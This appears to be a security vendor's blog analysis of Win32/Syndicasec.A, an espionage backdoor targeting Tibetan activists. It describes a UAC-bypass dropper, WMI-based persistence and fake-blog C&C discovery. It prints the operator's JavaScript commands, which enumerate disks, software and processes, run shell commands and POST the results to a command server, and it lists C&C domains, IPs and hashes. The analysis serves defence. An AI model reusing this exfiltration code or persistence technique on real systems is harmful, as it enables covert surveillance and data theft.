@@ -1,0 +1,287 @@
+Syndicasec in the sin bin: targeted espionage malware in action
+Technical analysis of Win32/Syndicasec.A, malware active in Nepal and China as far back as 2010, with a JavaScript payload registered in the Windows WMI subsystem and a system of fake blogs to discover its C&C servers, hosted on Tibet-related domains.
+
+23 May 2013 - 10:02AM
+
+Technical analysis of Win32/Syndicasec.A, malware active in Nepal and China as far back as 2010, with a JavaScript payload registered in the Windows WMI subsystem and a system of fake blogs to discover its C&C servers, hosted on Tibet-related domains.
+
+Malware researchers receive so many malicious code samples every day that prioritization for deep examination becomes an important part of the analysis process. In some instances, it is easier to decide than others. Such is the case for a sample we recently came across here at ESET named Win32/Syndicasec.A, for which the decision was pretty easy, for a variety of reasons:
+
+Our telemetry systems show that the infection scale is extremely small and strictly limited to Nepal and China. Previous versions of this threat were identified dating back to 2010.
+The main payload is a piece of Javascript code registered in the Windows WMI subsystem, an unusual technique.
+The threat uses fake blogs to discover its C&C servers, which are hosted on Tibet-related domains.
+The commands sent to our test machine infected for the purpose of this investigation were sent manually by the attacker and consisted in collecting information from the filesystem and the registry.
+The characteristics of this operation are very similar to previous campaigns of espionage against Tibetan activists such as OS X Lamadai and others.
+
+Read on to learn the details about the installation and persistence mechanisms used by this malware and its native capabilities and communication protocol. We will also present the bot behavior we observed during our analysis and conclude with some background research about the threat and the domains and IP addresses with which it is associated.
+
+Installation & Persistence
+
+Win32/Syndicasec uses an exploit to get access to a target computer in the first instance. Our engine successfully stopped the exploitation attempt but was unable to capture the original exploit itself. Upon successful exploitation, a two-stage installation process begins.
+
+The stage 1 dropper makes a few sanity checks on the system. It will look for the presence of %SYSTEM32%\sysprep.exe: if that is present, a cabinet archive (.cab) will be copied into the %TEMP% folder and its content (a single library) will be installed to %SYSTEM32%\cryptbase.dll using the standard Windows Update Standalone installer (wusa.exe):
+
+The Cabinet file is stored unobfuscated inside the dropper. Only the Cabinet file header is missing: this is dynamically corrected in memory prior to writing the file on disk.
+
+The dropper then attempts to exploit a vulnerability in Microsoft’s User Account Control (UAC) whitelisting process to run arbitrary commands with elevated privileges. This topic is well described by Leo Davidson.
+
+Inspecting the cryptbase.dll file reveals that it is a compiled version of Leo’s proof-of-concept code, right down to the exact return value of DllMain(), which is -69.
+
+This technique is one of the privilege escalation techniques used by Win32/Rootkit.Avatar, an advanced rootkit analyzed recently by our colleagues Anton Cherepanov and Aleksandr Matrosov.
+
+Inside the library, we can see a path related to the compilation project. We were not able to find any meaning to the “psm2” project name.
+
+Once this step has been performed, the second stage dropper is stored on disk as %TEMP%\gupdate.exe. If sysprep.exe is present on the system, the file is launched by a call to sysprep.exe, leveraging the UAC whitelist vulnerability previously explained. Otherwise, gupdate.exe is simply executed by a call to cmd.exe.
+
+Gupdate.exe is in charge of installing the real payload on the system. The technique used is one we rarely see in the wild and is based on the WMI subsystem that was well documented by Julius Dizon, et al of Trend Micro, in their excellent technical whitepaper available here. This same technique was also seen used by Stuxnet.
+
+This technique has the excellent property (from the attacker’s point of view) of not requiring any malicious code to be stored as a regular file on disk. This causes standard dynamic analysis tools such as Process Monitor to fail to clearly highlight the malicious activity.
+
+Here is how the final payload is persistently installed on a victim’s system. First, a piece of JavaScript is decrypted by gupdate.exe using a simple XOR operation:
+
+Then, the proper WMI classes are created.
+
+1. __TimerInstruction
+
+Win32/Syndicasec creates a __TimerInstruction to raise a custom event named “ProbeScriptInit” every 60,000 milliseconds.
+
+2. __EventFilter
+
+The __EventFilter class is responsible for linking the custom timer to the malicious code contained in the __EventConsumer element described below.
+
+3. __EventConsumer
+
+This class contains the malicious code to be executed every time the __TimerInstruction raises an event.
+
+These objects are permanently registered in the root\subscription namespace, thus ensuring stealth and persistence.
+
+Malware capabilities & network communication
+
+Let’s have a look now at the malicious script contained in the __EventConsumer object. The code is straightforward to analyze and almost self-documenting once properly formatted.
+
+First, one of the hardcoded URLs is randomly chosen and contacted via a standard HTTP GET.  We’ll call these the Stage One URLs. All the hardcoded URLs lead to a RSS feed for a fake blog seen here:
+
+The key element in this RSS feed is the <title> tag, which contains an encrypted string inside two ‘@’ delimiters.
+
+The script code shows which decoding routine is used to decrypt this string:
+
+The decrypted string reveals another URL, which we will call a Stage Two URL. These URLs provide the address of the C&C and are used to retrieve commands and post results.
+
+The initial communication sent to a Stage Two URL is an HTTP POST request containing some basic information about the infected machine. The response to this request is an HTML div element that may contain one or more commands.
+
+Static analysis shows that a populated command array consists of obfuscated Javascript that gets directly eval()’ed by the master script. There are no built-in functions in the master script, so at this point we cannot tell what this malware is being used for.
+
+Observed activity
+
+In parallel with analysis of the code, we started to monitor the behavior of a test machine that we infected with Win32/Syndicasec. The first few days of monitoring showed no activity whatsoever. We then started receiving commands from the C&C. The interaction between the C&C and the bot did not look to be automated at all. Every day would bring different commands sent at non-regular time intervals, making it look just as if someone was sitting behind a console and manually controlling infected hosts.
+
+Here is an excerpt from one of the first sessions with the C&C we observed. If you pay attention to the timestamps, the entire list of commands was spread over more than 30 minutes. Note that each command includes all the Javascript needed to execute the entrypoint function. We have included the entire code for only a few interesting calls for the sake of brevity.
+
+Commands that have the same timestamp were received in the same command array.
+
+21:40:36
+function getDataString(b) {var a = [];for (var i = 0; i < b.length; i++) {a.push(255 – b.charCodeAt(i))}var s = String.fromCharCode.apply(null, a);var c = $.oShell.ExpandEnvironmentStrings(“%Temp%”) + ‘\\KB2761465-IE8.bin’;$.oStream.Mode = 3;$.oStream.Open();$.oStream.Type = 2;$.oStream.Charset = ‘iso8859-1’;$.oStream.WriteText(s);$.oStream.SaveToFile(c, 2);$.oStream.Close();$.oStream.Type = 1;$.oStream.Open();$.oStream.loadfromfile(c);var d = $.oStream.Read();$.oStream.Close();returnd};function EnumDisk() {var e = GetObject(“winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2”);t = new Enumerator(e.ExecQuery(“select * from Win32_LogicalDisk”));var s = ”;while (!t.atEnd()) s += ‘{“Name”:”‘ + t.item().Caption + ‘”,”DriveType”:”‘ + t.item().DriveType + ‘”},’, t.moveNext();if (s.length > 0) s = s.substr(0, s.length – 1);$.oHttp.Open(“POST”, $.sXmlUrl + “?” + $.sURLParam + “&command=offlineresult&commandid=” + commands[i].id, !1);$.oHttp.setRequestHeader(“CONTENT-TYPE”, “file”);$.oHttp.Send(getDataString(‘[‘ + s + ‘]’));return “”
+};
+EnumDisk();
+
+21:41:37
+ExpandDirectory(‘C:\\’);
+
+21:41:37
+function ExecuteCommand(a) {var b = ‘asdfasfasfasdfsdfasdfsadf’;var c = $.oShell.exec(‘%ComSpec%’);c.StdIn.writeline(a);c.StdIn.writeline(b);var d = ”;while (!c.StdOut.AtEndOfStream) {var e = c.StdOut.ReadLine();if (e.match(b)) {d += e.replace(b, ”) + ‘\r\n’;break}d += e +‘\r\n’}$.oHttp.Open(‘POST’, $.sXmlUrl + ‘?’ + $.sURLParam + ‘&command=offlineresult&commandid=’ + commands[i].id, false);$.oHttp.setRequestHeader(‘CONTENT-TYPE’, ‘file’);$.oHttp.Send(getDataString(d));return”};ExecuteCommand(‘system32info’);
+
+21:42:37
+ExpandDirectory(‘C:\\Documents and Settings\\’);
+
+21:42:37
+ExecuteCommand(‘systeminfo’);
+
+21:45:07
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\’);
+
+21:45:07
+ExecuteCommand(‘net start’);
+
+21:45:36
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\Desktop\\’);
+
+21:46:37
+ExecuteCommand(‘tasklist’);
+
+21:46:37
+ExpandDirectory(‘C:\\Documents and Settings\\user\\’);
+
+21:47:37
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\Recent\\’);
+
+21:48:48
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\.idlerc\\’);
+
+21:48:48
+ExecuteCommand(‘net view’);
+
+21:51:36
+ExecuteCommand(‘net use’);
+
+21:52:38
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\My Documents\\’);
+
+22:07:37
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\Recent\\’);
+
+22:10:38
+ExpandDirectory(‘C:\\Documents and Settings\\user\\’);
+
+22:13:38
+EnumDisk();
+
+22:13:38
+ExpandDirectory(‘C:\\’);
+
+22:14:39
+ExpandDirectory(‘C:\\Documents and Settings\\user\\’);
+
+22:14:39
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\Recent\\’);
+
+22:14:39
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\Recent\\’);
+
+Basically, the operator was browsing our filesystem and looking at detailed settings and operations on the infected machine, such as network settings, attached drives and running programs.
+
+The day after this visit, the operator sent another set of commands to gather some system information specific to our infected system.
+
+22:34:50
+function EnumInstaller() {var s = ”;var a = 0x80000002;var b = “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\”;var c = GetObject(“winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv”);var d = c.Methods_.Item(“EnumKey”);var e = d.InParameters.SpawnInstance_();e.hDefKey = 0x80000002;e.sSubKeyName = b;var f = c.ExecMethod_(d.Name, e);var g = new Enumerator(f.sNames.toArray());while (!g.atEnd()) {var h = g.item();d = c.Methods_.Item(“GetStringValue”);e = d.InParameters.SpawnInstance_();e.hDefKey = 0x80000002;e.sSubKeyName = b + h;e.sValueName = “DisplayName”;f = c.ExecMethod_(d.Name, e);var j = f.sValue;e.sValueName = “UninstallString”;f = c.ExecMethod_(d.Name, e);var k = f.sValue;e.sValueName = “InstallDate”;f = c.ExecMethod_(d.Name, e);var l = f.sValue;e.sValueName = “InstallLocation”;f = c.ExecMethod_(d.Name, e);var m = f.sValue;s += ‘{‘ + ‘”InstallerName”:”‘ + h + ‘”,”DisplayName”:”‘ + j + ‘”,”UninstallString”:”‘ + escape(f.sValue) + ‘”,”InstallDate”:”‘ + l + ‘”,”InstallLocation”:”‘ + escape(m) + ‘”},’;g.moveNext()}
+if (s.length > 0) s = s.substr(0, s.length – 1);
+$.oHttp.Open(‘POST’, $.sXmlUrl + ‘?’ + $.sURLParam + ‘&command=offlineresult&commandid=’ + commands[i].id, false);
+$.oHttp.setRequestHeader(‘CONTENT-TYPE’, ‘file’);
+$.oHttp.Send(getDataString(‘[‘ + s + ‘]’));
+return ”
+};
+EnumInstaller();
+
+22:34:50
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\DRM\\’);
+
+22:35:35
+ExpandDirectory(‘C:\\Python27\\Tools\\’);
+
+22:36:35
+EnumDisk();
+
+22:37:39
+function EnumProduct() {var a = GetObject(“winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2”);var b = new Enumerator(a.ExecQuery(“Select * from Win32_Product”));var s = ”;while (!b.atEnd()) {var c = b.item();s += ‘{‘ + ‘”ProductName”:”‘ + c.Name + ‘”,”InstallLocation”:”‘ + escape(c.InstallLocation) + ‘”,”PackageCache”:”‘ + escape(c.PackageCache) + ‘”},’;b.moveNext()}if (s.length > 0) s = s.substr(0, s.length – 1);$.oHttp.Open(‘POST’, $.sXmlUrl + ‘?’ + $.sURLParam + ‘&command=offlineresult&commandid=’ + commands[i].id, false);$.oHttp.setRequestHeader(‘CONTENT-TYPE’, ‘file’);$.oHttp.Send(getDataString(‘[‘ + s + ‘]’));return”};EnumProduct();
+
+22:37:39
+EnumProcess();
+
+22:39:36
+ExpandDirectory(‘C:\\Documents and Settings\\Default User\\Start Menu\\’);
+
+22:41:36
+ExpandDirectory(‘C:\\Documents and Settings\\Default User\\Start Menu\\Programs\\’);
+
+22:41:36
+EnumDisk();
+
+22:41:36
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\Start Menu\\’);
+
+22:42:35
+ExpandDirectory(‘C:\\Documents and Settings\\All Users\\My Documents\\’);
+
+22:47:35
+ExecuteCommand(‘dir c:\\’);
+
+22:48:35
+ExecuteCommand(‘dir /a/s c:\\program files\\’);
+
+22:48:35
+ExecuteCommand(‘dir c:\\dir c:’);
+
+22:53:38
+ExecuteCommand(‘dir /a/s c:\\progra~1’);
+
+22:56:36
+ExpandDirectory(‘C:\\Documents and Settings\\Default User\\Local Settings\\’);
+
+22:57:37
+EnumDisk();
+
+23:03:35
+ExecuteCommand(‘systeminfo’);
+
+In this session, the commands sent by the operator had roughly the same purpose, but were done differently, strongly suggesting a different operator to the previous day. We also note some sort of typo or bug in this line:
+
+ExecuteCommand(‘dir c:\\dir c:’);
+
+The Stage Two URLs remained unchanged until 2013-04-22. The three blog entries in the hardcoded Stage One URLs were all changed on that same day within a 30-minute window to direct infected systems to a new Stage Two domain: netfortibt.info. Details of this new domain can be found in the next section.
+
+Malware history
+
+Now that we know how the malware gets installed on a target system and what capabilities it offers to the attacker, let’s establish some context around this threat.
+
+First, we were able to find a version of the master script dating from July 2010, uploaded to an online Javascript analyzer. The screenshot below shows some differences in the first few lines of the script. We can clearly see the version number evolution, passing from 0.5.2 to a 1.2.0 release.
+
+When further analyzing the differences between the two versions, we can see that the encryption present in the <title> tag of the Stage One RSS feed did not change. On the other hand, the commands sent from the C&C went from cleartext to being encrypted in version 1.2.0 of the script (see the circleDecode() function):
+
+Finally, we can see that the old version performs the WMI calls needed to register itself in the root\subscription namespace, while version 1.2.0 depends on its dropper to perform this step.
+
+The old script contains only one hardcoded Stage One URL, which is still active at the time of writing.
+
+We can see that only twenty-five (25) users have visited this page since it was posted in September 2010. The decrypted <title> tag reveals an inactive Stage Two URL (http://<redacted>.hostaim.com/summer/ieupdate.php).
+
+Another piece of information was also found using the same Javascript analyzer. We can see a dialogue between an infected host and a C&C dating from 2012. The query string reveals that the infected host is running version 1.01 of the master script.
+
+This clearly shows that this threat has been maintained and used over several years.
+
+Let’s look now at the domains involved in this operation. The Stage One 1 URLs are all pointing to free blog-sites and are rather uninteresting. The Stage Two URLs are more relevant and deserve closer examination.
+
+In the course of our monitoring, we saw two active Stage Two URLs:
+
+Domain
+Registrar
+Created On
+IP
+
+tbtworld.info
+GoDaddyRegistrant Name: boorn zeroseven
+2012-09-18
+2012-11-21: 209.141.36.23 (BuyVM, Canada)2013-03-25 –  2013-04-19: 216.83.45.18  (Ethr.Net LLC, USA)> 2013-04-19: 195.43.45.18 (Routo Telecom, UK)
+
+nedfortibt.info
+GoDaddyRegistrant Name: Tsering Duoten
+2013-04-18
+216.83.45.18 (BuyVM, Canada)
+
+Related domain (found having an A record identical to tbtworld.info):
+
+tbtsociety.info
+
+GoDaddyRegistrant Name: boorn zeroseven
+2012-09-18
+2012-11-21: 209.141.36.23 (BuyVM, Canada)2013-04-30: 215.43.40.16 (DoD, USA)
+
+Unlike the DoD IP, the other three IPs reveal many hundreds of domain names to which A records are pointing. Most of these domains were registered less than a year ago and point to amateur-looking websites for small businesses, all in Asian languages.
+
+The three domains shown in the previous table also reveal a clear reference to Tibet.  The ‘ned’ in ‘nedfortibt.info’ relates to the National Endowment for Democracy organization, described on their website as: “a private, nonprofit foundation dedicated to the growth and strengthening of democratic institutions around the world. Each year, with funding from the US Congress, NED supports more than 1,000 projects of non-governmental groups abroad who are working for democratic goals in more than 90 countries.”
+
+The NED is openly supportive of Tibetans in their uneasy relations with China.
+
+Conclusion
+
+This analysis showed an implementation of rather unusual techniques to build a stealthy and flexible backdoor. The lack of built-in commands prevents us from discovering the real end-goal of this operation. However, we can affirm that the various characteristics observed around this threat are similar to other espionage campaigns against Tibetan activists that we have observed.
+
+MD5 hashes of the files analyzed:
+
+stage1_dropper.exe      7ee6a8cc75b5e8adf64af899fabd88a4
+gupdate.exe             b60ce366e142200e3191a1dffdf7283c
+CryptBase.dll           c469b1010f348bd4a5bd5471ff388464
+
+123
+
+stage1_dropper.exe      7ee6a8cc75b5e8adf64af899fabd88a4gupdate.exe             b60ce366e142200e3191a1dffdf7283cCryptBase.dll           c469b1010f348bd4a5bd5471ff388464
+
+Alexis Dorais-Joncas
+Security Intelligence Team Lead
